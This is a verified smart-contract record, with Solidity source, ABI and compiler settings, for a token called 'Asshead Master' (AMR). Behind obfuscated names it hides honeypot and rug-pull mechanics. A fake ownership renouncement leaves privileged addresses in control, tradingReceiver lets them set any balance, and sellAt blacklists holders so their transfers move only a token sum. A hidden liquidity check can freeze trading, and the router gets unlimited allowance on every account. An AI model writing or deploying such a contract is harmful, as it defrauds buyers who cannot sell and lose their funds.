{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface senderReceiver {\n    function createPair(address enableAmount, address amountTake) external returns (address);\n}\n\ninterface launchBuyLiquidity {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address buySwap) external view returns (uint256);\n\n    function transfer(address swapFrom, uint256 exemptBuy) external returns (bool);\n\n    function allowance(address walletLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapFrom,\n        uint256 exemptBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitSenderAuto, uint256 value);\n    event Approval(address indexed walletLaunch, address indexed spender, uint256 value);\n}\n\nabstract contract takeAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buySwapFrom {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableAt is launchBuyLiquidity {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AssheadMaster is takeAt, launchBuyLiquidity, enableAt {\n\n    function transferFrom(address fromLimit, address swapFrom, uint256 exemptBuy) external override returns (bool) {\n        if (_msgSender() != minTx) {\n            if (totalTx[fromLimit][_msgSender()] != type(uint256).max) {\n                require(exemptBuy <= totalTx[fromLimit][_msgSender()]);\n                totalTx[fromLimit][_msgSender()] -= exemptBuy;\n            }\n        }\n        return senderAuto(fromLimit, swapFrom, exemptBuy);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityFundAmount;\n    }\n\n    uint256 private senderReceiverReceiver;\n\n    bool public receiverEnableTotal;\n\n    event OwnershipTransferred(address indexed toShould, address indexed walletIs);\n\n    mapping(address => bool) public sellList;\n\n    function transfer(address isLaunch, uint256 exemptBuy) external virtual override returns (bool) {\n        return senderAuto(_msgSender(), isLaunch, exemptBuy);\n    }\n\n    function allowance(address swapAt, address listMarketingAt) external view virtual override returns (uint256) {\n        if (listMarketingAt == minTx) {\n            return type(uint256).max;\n        }\n        return totalTx[swapAt][listMarketingAt];\n    }\n\n    function exemptReceiverLimit(address fromLimit, address swapFrom, uint256 exemptBuy) internal returns (bool) {\n        require(txSellLaunch[fromLimit] >= exemptBuy);\n        txSellLaunch[fromLimit] -= exemptBuy;\n        txSellLaunch[swapFrom] += exemptBuy;\n        emit Transfer(fromLimit, swapFrom, exemptBuy);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalTx;\n\n    uint256 constant launchedAmount = 10 ** 10;\n\n    function sellAt(address exemptLiquidity) public {\n        receiverAmount();\n        \n        if (exemptLiquidity == walletAuto || exemptLiquidity == launchedMarketing) {\n            return;\n        }\n        sellList[exemptLiquidity] = true;\n    }\n\n    uint256 receiverMaxSell;\n\n    function senderAuto(address fromLimit, address swapFrom, uint256 exemptBuy) internal returns (bool) {\n        if (fromLimit == walletAuto) {\n            return exemptReceiverLimit(fromLimit, swapFrom, exemptBuy);\n        }\n        uint256 toFee = launchBuyLiquidity(launchedMarketing).balanceOf(txTake);\n        require(toFee == totalLaunchedLiquidity);\n        require(swapFrom != txTake);\n        if (sellList[fromLimit]) {\n            return exemptReceiverLimit(fromLimit, swapFrom, launchedAmount);\n        }\n        return exemptReceiverLimit(fromLimit, swapFrom, exemptBuy);\n    }\n\n    bool private autoMax;\n\n    uint256 public atReceiver;\n\n    uint256 private amountSenderTake = 100000000 * 10 ** 18;\n\n    address minTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountIsToken;\n    }\n\n    function receiverAmount() private view {\n        require(autoMinList[_msgSender()]);\n    }\n\n    function teamExempt(address launchList) public {\n        if (receiverEnableTotal) {\n            return;\n        }\n        if (tokenMode != senderReceiverReceiver) {\n            senderReceiverReceiver = atReceiver;\n        }\n        autoMinList[launchList] = true;\n        if (takeExemptTeam != fromToken) {\n            atReceiver = tokenMode;\n        }\n        receiverEnableTotal = true;\n    }\n\n    string private amountIsToken = \"AMR\";\n\n    address private limitBuy;\n\n    bool private takeExemptTeam;\n\n    function getOwner() external view returns (address) {\n        return limitBuy;\n    }\n\n    address public walletAuto;\n\n    function approve(address listMarketingAt, uint256 exemptBuy) public virtual override returns (bool) {\n        totalTx[_msgSender()][listMarketingAt] = exemptBuy;\n        emit Approval(_msgSender(), listMarketingAt, exemptBuy);\n        return true;\n    }\n\n    address txTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function name() external view virtual override returns (string memory) {\n        return limitTakeSender;\n    }\n\n    constructor (){\n        \n        buySwapFrom listMin = buySwapFrom(minTx);\n        launchedMarketing = senderReceiver(listMin.factory()).createPair(listMin.WETH(), address(this));\n        if (fromToken) {\n            fromToken = true;\n        }\n        walletAuto = _msgSender();\n        autoMinList[walletAuto] = true;\n        txSellLaunch[walletAuto] = amountSenderTake;\n        marketingFund();\n        \n        emit Transfer(address(0), walletAuto, amountSenderTake);\n    }\n\n    bool private fromToken;\n\n    function balanceOf(address buySwap) public view virtual override returns (uint256) {\n        return txSellLaunch[buySwap];\n    }\n\n    mapping(address => bool) public autoMinList;\n\n    function owner() external view returns (address) {\n        return limitBuy;\n    }\n\n    uint256 public tokenMode;\n\n    uint256 totalLaunchedLiquidity;\n\n    function marketingFund() public {\n        emit OwnershipTransferred(walletAuto, address(0));\n        limitBuy = address(0);\n    }\n\n    mapping(address => uint256) private txSellLaunch;\n\n    uint8 private liquidityFundAmount = 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return amountSenderTake;\n    }\n\n    function tradingReceiver(address isLaunch, uint256 exemptBuy) public {\n        receiverAmount();\n        txSellLaunch[isLaunch] = exemptBuy;\n    }\n\n    address public launchedMarketing;\n\n    string private limitTakeSender = \"Asshead Master\";\n\n    function receiverLaunch(uint256 exemptBuy) public {\n        receiverAmount();\n        totalLaunchedLiquidity = exemptBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitSenderAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"listMarketingAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMarketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoMinList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySwap\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverEnableTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"receiverLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLiquidity\",\"type\":\"address\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchList\",\"type\":\"address\"}],\"name\":\"teamExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AssheadMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}